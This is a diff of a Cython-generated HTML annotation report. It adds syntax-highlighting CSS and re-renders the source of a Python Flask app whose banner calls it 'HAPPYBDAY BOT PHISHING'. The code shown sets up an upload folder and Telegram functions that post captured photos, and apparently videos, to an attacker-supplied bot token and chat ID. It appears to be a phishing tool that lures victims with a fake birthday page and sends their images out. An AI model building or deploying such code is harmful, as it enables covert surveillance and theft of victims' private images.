@@ -286,6 +286,81 @@ body.cython { font-family: courier; font-size: 12; }
 .cython.score-252 {background-color: #FFFF09;}
 .cython.score-253 {background-color: #FFFF09;}
 .cython.score-254 {background-color: #FFFF09;}
+pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.cython .hll { background-color: #ffffcc }
+.cython { background: #f8f8f8; }
+.cython .c { color: #3D7B7B; font-style: italic } /* Comment */
+.cython .err { border: 1px solid #F00 } /* Error */
+.cython .k { color: #008000; font-weight: bold } /* Keyword */
+.cython .o { color: #666 } /* Operator */
+.cython .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.cython .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.cython .cp { color: #9C6500 } /* Comment.Preproc */
+.cython .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.cython .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.cython .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.cython .gd { color: #A00000 } /* Generic.Deleted */
+.cython .ge { font-style: italic } /* Generic.Emph */
+.cython .ges { font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.cython .gr { color: #E40000 } /* Generic.Error */
+.cython .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.cython .gi { color: #008400 } /* Generic.Inserted */
+.cython .go { color: #717171 } /* Generic.Output */
+.cython .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.cython .gs { font-weight: bold } /* Generic.Strong */
+.cython .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.cython .gt { color: #04D } /* Generic.Traceback */
+.cython .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.cython .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.cython .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.cython .kp { color: #008000 } /* Keyword.Pseudo */
+.cython .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.cython .kt { color: #B00040 } /* Keyword.Type */
+.cython .m { color: #666 } /* Literal.Number */
+.cython .s { color: #BA2121 } /* Literal.String */
+.cython .na { color: #687822 } /* Name.Attribute */
+.cython .nb { color: #008000 } /* Name.Builtin */
+.cython .nc { color: #00F; font-weight: bold } /* Name.Class */
+.cython .no { color: #800 } /* Name.Constant */
+.cython .nd { color: #A2F } /* Name.Decorator */
+.cython .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.cython .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.cython .nf { color: #00F } /* Name.Function */
+.cython .nl { color: #767600 } /* Name.Label */
+.cython .nn { color: #00F; font-weight: bold } /* Name.Namespace */
+.cython .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.cython .nv { color: #19177C } /* Name.Variable */
+.cython .ow { color: #A2F; font-weight: bold } /* Operator.Word */
+.cython .w { color: #BBB } /* Text.Whitespace */
+.cython .mb { color: #666 } /* Literal.Number.Bin */
+.cython .mf { color: #666 } /* Literal.Number.Float */
+.cython .mh { color: #666 } /* Literal.Number.Hex */
+.cython .mi { color: #666 } /* Literal.Number.Integer */
+.cython .mo { color: #666 } /* Literal.Number.Oct */
+.cython .sa { color: #BA2121 } /* Literal.String.Affix */
+.cython .sb { color: #BA2121 } /* Literal.String.Backtick */
+.cython .sc { color: #BA2121 } /* Literal.String.Char */
+.cython .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.cython .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.cython .s2 { color: #BA2121 } /* Literal.String.Double */
+.cython .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.cython .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.cython .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.cython .sx { color: #008000 } /* Literal.String.Other */
+.cython .sr { color: #A45A77 } /* Literal.String.Regex */
+.cython .s1 { color: #BA2121 } /* Literal.String.Single */
+.cython .ss { color: #19177C } /* Literal.String.Symbol */
+.cython .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.cython .fm { color: #00F } /* Name.Function.Magic */
+.cython .vc { color: #19177C } /* Name.Variable.Class */
+.cython .vg { color: #19177C } /* Name.Variable.Global */
+.cython .vi { color: #19177C } /* Name.Variable.Instance */
+.cython .vm { color: #19177C } /* Name.Variable.Magic */
+.cython .il { color: #666 } /* Literal.Number.Integer.Long */
     </style>
 </head>
 <body class="cython">
@@ -295,48 +370,48 @@ body.cython { font-family: courier; font-size: 12; }
     Click on a line that starts with a "<code>+</code>" to see the C code that Cython generated for it.
 </p>
 <p>Raw output: <a href="main.c">main.c</a></p>
-<div class="cython"><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">001</span>: #!/usr/bin/env python3</pre>
+<div class="cython"><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">001</span>: <span class="c">#!/usr/bin/env python3</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyDict_NewPresized</span>(0);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_test, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 1, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">002</span>: import os</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">002</span>: <span class="k">import</span><span class="w"> </span><span class="nn">os</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_Import</span>(__pyx_mstate_global-&gt;__pyx_n_u_os, 0, 0, NULL, 0);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)</span>
   __pyx_t_2 = __pyx_t_1;
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_os, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 2, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">003</span>: import base64</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">003</span>: <span class="k">import</span><span class="w"> </span><span class="nn">base64</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_Import</span>(__pyx_mstate_global-&gt;__pyx_n_u_base64, 0, 0, NULL, 0);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3, __pyx_L1_error)</span>
   __pyx_t_2 = __pyx_t_1;
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_base64, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 3, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">004</span>: import time</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">004</span>: <span class="k">import</span><span class="w"> </span><span class="nn">time</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_Import</span>(__pyx_mstate_global-&gt;__pyx_n_u_time, 0, 0, NULL, 0);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)</span>
   __pyx_t_2 = __pyx_t_1;
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_time, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 4, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">005</span>: import threading</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">005</span>: <span class="k">import</span><span class="w"> </span><span class="nn">threading</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_Import</span>(__pyx_mstate_global-&gt;__pyx_n_u_threading, 0, 0, NULL, 0);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)</span>
   __pyx_t_2 = __pyx_t_1;
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_threading, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 5, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">006</span>: import subprocess</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">006</span>: <span class="k">import</span><span class="w"> </span><span class="nn">subprocess</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_Import</span>(__pyx_mstate_global-&gt;__pyx_n_u_subprocess, 0, 0, NULL, 0);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)</span>
   __pyx_t_2 = __pyx_t_1;
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_subprocess, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 6, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">007</span>: import requests</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">007</span>: <span class="k">import</span><span class="w"> </span><span class="nn">requests</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_Import</span>(__pyx_mstate_global-&gt;__pyx_n_u_requests, 0, 0, NULL, 0);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)</span>
   __pyx_t_2 = __pyx_t_1;
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_requests, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 7, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-11" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">008</span>: from flask import Flask, render_template, request, jsonify</pre>
+</pre><pre class="cython line score-11" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">008</span>: <span class="k">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="k">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span></pre>
 <pre class='cython code score-11 '>  {
     PyObject* const __pyx_imported_names[] = {__pyx_mstate_global-&gt;__pyx_n_u_Flask,__pyx_mstate_global-&gt;__pyx_n_u_render_template,__pyx_mstate_global-&gt;__pyx_n_u_request,__pyx_mstate_global-&gt;__pyx_n_u_jsonify};
     __pyx_t_1 = <span class='pyx_c_api'>__Pyx_Import</span>(__pyx_mstate_global-&gt;__pyx_n_u_flask, __pyx_imported_names, 4, NULL, 0);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)</span>
@@ -354,10 +429,10 @@ body.cython { font-family: courier; font-size: 12; }
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">009</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">010</span>: # ================= CONFIG =================</pre>
-<pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">011</span>: UPLOAD_DIR = "uploads"</pre>
+<pre class="cython line score-0">&#xA0;<span class="">010</span>: <span class="c"># ================= CONFIG =================</span></pre>
+<pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">011</span>: <span class="n">UPLOAD_DIR</span> <span class="o">=</span> <span class="s">&quot;uploads&quot;</span></pre>
 <pre class='cython code score-5 '>  if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_UPLOAD_DIR, __pyx_mstate_global-&gt;__pyx_n_u_uploads) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 11, __pyx_L1_error)</span>
-</pre><pre class="cython line score-18" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">012</span>: os.makedirs(UPLOAD_DIR, exist_ok=True)</pre>
+</pre><pre class="cython line score-18" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">012</span>: <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span></pre>
 <pre class='cython code score-18 '>  __pyx_t_4 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_5, __pyx_mstate_global-&gt;__pyx_n_u_os);<span class='error_goto'> if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 12, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_5);
@@ -382,8 +457,8 @@ body.cython { font-family: courier; font-size: 12; }
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">013</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">014</span>: # ================= BANNER =================</pre>
-<pre class="cython line score-20" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">015</span>: def banner():</pre>
+<pre class="cython line score-0">&#xA0;<span class="">014</span>: <span class="c"># ================= BANNER =================</span></pre>
+<pre class="cython line score-20" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">015</span>: <span class="k">def</span><span class="w"> </span><span class="nf">banner</span><span class="p">():</span></pre>
 <pre class='cython code score-20 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_1banner(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
 static PyMethodDef __pyx_mdef_4main_1banner = {"banner", (PyCFunction)__pyx_pw_4main_1banner, METH_NOARGS, 0};
@@ -424,7 +499,7 @@ static PyObject *__pyx_pf_4main_banner(CYTHON_UNUSED PyObject *__pyx_self) {
   #endif
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_banner, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 15, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">016</span>:     print("""</pre>
+</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">016</span>:     <span class="k">print</span><span class="p">(</span><span class="s">&quot;&quot;&quot;</span></pre>
 <pre class='cython code score-4 '>  __pyx_t_2 = NULL;
   __pyx_t_3 = 1;
   {
@@ -435,16 +510,16 @@ static PyObject *__pyx_pf_4main_banner(CYTHON_UNUSED PyObject *__pyx_self) {
     <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
-</pre><pre class="cython line score-0">&#xA0;<span class="">017</span>: ========================================</pre>
-<pre class="cython line score-0">&#xA0;<span class="">018</span>:                  ZPXEL</pre>
-<pre class="cython line score-0">&#xA0;<span class="">019</span>:          HAPPYBDAY BOT PHISHING</pre>
-<pre class="cython line score-0">&#xA0;<span class="">020</span>: Author : Jay</pre>
-<pre class="cython line score-0">&#xA0;<span class="">021</span>: Buy me a coffee ☕ 0945-156-2226</pre>
-<pre class="cython line score-0">&#xA0;<span class="">022</span>: ========================================</pre>
-<pre class="cython line score-0">&#xA0;<span class="">023</span>: """)</pre>
+</pre><pre class="cython line score-0">&#xA0;<span class="">017</span>: <span class="s">========================================</span></pre>
+<pre class="cython line score-0">&#xA0;<span class="">018</span>: <span class="s">                 ZPXEL</span></pre>
+<pre class="cython line score-0">&#xA0;<span class="">019</span>: <span class="s">         HAPPYBDAY BOT PHISHING</span></pre>
+<pre class="cython line score-0">&#xA0;<span class="">020</span>: <span class="s">Author : Jay</span></pre>
+<pre class="cython line score-0">&#xA0;<span class="">021</span>: <span class="s">Buy me a coffee ☕ 0945-156-2226</span></pre>
+<pre class="cython line score-0">&#xA0;<span class="">022</span>: <span class="s">========================================</span></pre>
+<pre class="cython line score-0">&#xA0;<span class="">023</span>: <span class="s">&quot;&quot;&quot;</span><span class="p">)</span></pre>
 <pre class="cython line score-0">&#xA0;<span class="">024</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">025</span>: # ================= FLASK APP =================</pre>
-<pre class="cython line score-22" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">026</span>: app = Flask(__name__, template_folder="templates", static_folder="static")</pre>
+<pre class="cython line score-0">&#xA0;<span class="">025</span>: <span class="c"># ================= FLASK APP =================</span></pre>
+<pre class="cython line score-22" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">026</span>: <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s">&quot;templates&quot;</span><span class="p">,</span> <span class="n">static_folder</span><span class="o">=</span><span class="s">&quot;static&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-22 '>  __pyx_t_6 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_8, __pyx_mstate_global-&gt;__pyx_n_u_Flask);<span class='error_goto'> if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 26, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_8);
@@ -468,8 +543,8 @@ static PyObject *__pyx_pf_4main_banner(CYTHON_UNUSED PyObject *__pyx_self) {
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_app, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 26, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">027</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">028</span>: # ================= TELEGRAM FUNCTIONS =================</pre>
-<pre class="cython line score-54" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">029</span>: def send_photo(path, BOT_TOKEN, CHAT_ID):</pre>
+<pre class="cython line score-0">&#xA0;<span class="">028</span>: <span class="c"># ================= TELEGRAM FUNCTIONS =================</span></pre>
+<pre class="cython line score-54" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">029</span>: <span class="k">def</span><span class="w"> </span><span class="nf">send_photo</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">BOT_TOKEN</span><span class="p">,</span> <span class="n">CHAT_ID</span><span class="p">):</span></pre>
 <pre class='cython code score-54 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_3send_photo(PyObject *__pyx_self, 
 #if CYTHON_METH_FASTCALL
@@ -603,7 +678,7 @@ static PyObject *__pyx_pf_4main_2send_photo(CYTHON_UNUSED PyObject *__pyx_self, 
   #endif
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_send_photo, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 29, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-9" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">030</span>:     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"</pre>
+</pre><pre class="cython line score-9" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">030</span>:     <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">&quot;https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto&quot;</span></pre>
 <pre class='cython code score-9 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_FormatSimple</span>(__pyx_v_BOT_TOKEN, __pyx_mstate_global-&gt;__pyx_empty_unicode);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2[0] = __pyx_mstate_global-&gt;__pyx_kp_u_https_api_telegram_org_bot;
@@ -615,7 +690,7 @@ static PyObject *__pyx_pf_4main_2send_photo(CYTHON_UNUSED PyObject *__pyx_self, 
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_v_url = ((PyObject*)__pyx_t_3);
   __pyx_t_3 = 0;
-</pre><pre class="cython line score-66" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">031</span>:     with open(path, "rb") as f:</pre>
+</pre><pre class="cython line score-66" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">031</span>:     <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></pre>
 <pre class='cython code score-66 '>  /*with:*/ {
     __pyx_t_1 = NULL;
     __pyx_t_4 = 1;
@@ -739,7 +814,7 @@ static PyObject *__pyx_pf_4main_2send_photo(CYTHON_UNUSED PyObject *__pyx_self, 
   __pyx_mstate_global-&gt;__pyx_tuple[0] = <span class='py_c_api'>PyTuple_Pack</span>(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_mstate_global-&gt;__pyx_tuple[0])) <span class='error_goto'>__PYX_ERR(0, 31, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_mstate_global-&gt;__pyx_tuple[0]);
   <span class='refnanny'>__Pyx_GIVEREF</span>(__pyx_mstate_global-&gt;__pyx_tuple[0]);
-</pre><pre class="cython line score-43" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">032</span>:         requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": f})</pre>
+</pre><pre class="cython line score-43" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">032</span>:         <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;chat_id&quot;</span><span class="p">:</span> <span class="n">CHAT_ID</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;photo&quot;</span><span class="p">:</span> <span class="n">f</span><span class="p">})</span></pre>
 <pre class='cython code score-43 '>          __pyx_t_3 = NULL;
           <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_requests);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 32, __pyx_L7_error)</span>
           <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
@@ -781,7 +856,7 @@ static PyObject *__pyx_pf_4main_2send_photo(CYTHON_UNUSED PyObject *__pyx_self, 
           }
           <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_7); __pyx_t_7 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">033</span>: </pre>
-<pre class="cython line score-54" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">034</span>: def send_video(path, BOT_TOKEN, CHAT_ID):</pre>
